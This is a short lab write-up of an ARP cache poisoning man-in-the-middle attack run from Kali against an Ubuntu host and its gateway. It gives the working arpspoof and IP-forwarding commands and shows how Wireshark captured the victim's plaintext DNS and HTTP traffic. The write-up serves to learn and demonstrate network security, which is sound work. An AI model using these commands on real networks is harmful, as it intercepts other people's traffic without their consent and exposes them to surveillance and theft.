
**The Goal:** Show you can intercept and analyze real-world traffic.

 Man-in-the-Middle (MitM) via ARP Poisoning

  Objective
To intercept and analyze traffic between a target host (Ubuntu) and the Gateway (Router) using ARP Cache Poisoning and Wireshark.

  Technical Execution

 1. Enabling IP Forwarding
To prevent a Denial of Service (DoS) on the victim, I enabled IPv4 forwarding on the Kali host:

```bash
sudo sysctl -w net.ipv4.ip_forward=1

```
2. Executing the ARP Spoof
Initiated a bi-directional attack to position Kali as the "Man-in-the-Middle":

Terminal 1 (Victim): 
```bash
sudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]

```
Terminal 2 (Gateway):
```bash
sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]

```
3. Traffic Analysis (Wireshark)
   ```bash
   wireshark
I monitored the eth0 interface and filtered for the victim's IP.

Key Findings:

DNS Leakage: Observed plain-text DNS queries (Port 53), revealing the victim's destination hostnames.

HTTP Exposure: Navigated to http://neverssl.com on the victim. Using "Follow HTTP Stream" in Wireshark, I reconstructed the full HTML source code of the webpage from intercepted packets.
